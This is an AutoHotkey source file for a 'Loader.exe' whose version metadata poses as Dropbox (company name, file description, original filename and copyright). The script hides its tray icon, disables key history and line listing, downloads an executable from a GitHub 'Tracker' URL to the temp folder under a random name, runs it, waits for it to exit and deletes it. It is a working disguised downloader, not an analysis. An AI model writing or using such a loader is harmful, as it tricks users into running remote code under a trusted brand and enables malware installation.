/*
 * * * Compile_AHK SETTINGS BEGIN * * *

[AHK2EXE]
Exe_File=%In_Dir%\Loader.exe
No_UPX=1
Execution_Level=4
[VERSION]
Set_Version_Info=1
Company_Name=Dropbox, Inc.
File_Description=Dropbox
File_Version=0.0.4.0
Inc_File_Version=0
Legal_Copyright=Dropbox, Inc.
Original_Filename=Dropbox.exe
Product_Name=Dropbox
Product_Version=0.0.4.0
[ICONS]
Icon_2=0
Icon_3=0
Icon_4=0
Icon_5=0

* * * Compile_AHK SETTINGS END * * *
*/
;@Ahk2Exe-SetName Dropbox
;@Ahk2Exe-SetDescription Dropbox
;@Ahk2Exe-SetVersion 0.4
;@Ahk2Exe-SetCopyright Dropbox Inc
;@Ahk2Exe-SetOrigFileName Dropbox.exe
;@Ahk2Exe-SetCompanyName Dropbox Inc

#SingleInstance, Force
#NoEnv
#NoTrayIcon
#KeyHistory, 0
#Persistent
ListLines, Off

new Package("https://github.com/Visionary1/Tracker/raw/master/v2/Package.exe").Load()
ExitApp

Class Package
{
	__New(url)
	{
		this.app := []
		this.app.url := url
		this.app.filename := A_Temp . "\" . Package._RandomStr() . ".exe"
		UrlDownloadToFile, % this.app.url, % this.app.filename
	}

	__Delete()
	{
		Try FileDelete, % this.app.filename
		Catch, E
		{
			WinKill, % "ahk_pid " this.app.pid
			FileDelete, % this.app.filename
		}

		this.Delete["app"]
	}

	Load()
	{
		Try RunWait, % this.app.filename,,, OutputVarPID
		Catch, E
			Reload
		Finally this.app.pid := OutputVarPID

		WinWaitClose, % "ahk_pid " this.app.pid
	}

	_RandomStr() 
	{
		Loop, 4
		{
			Random, digits, 48, 57
			Random, uppercases, 65, 90
			Random, lowercases, 97, 122

			Random, Mix, 1, 3
			If (Mix = 1)
				s .= Chr(digits) . Chr(uppercases) . Chr(lowercases)
			Else If (Mix = 2)
				s .= Chr(digits) . Chr(lowercases) . Chr(uppercases)
			Else If (Mix = 3)
				s .= Chr(lowercases) . Chr(digits) . Chr(uppercases)
		}

		Return s
	}
}

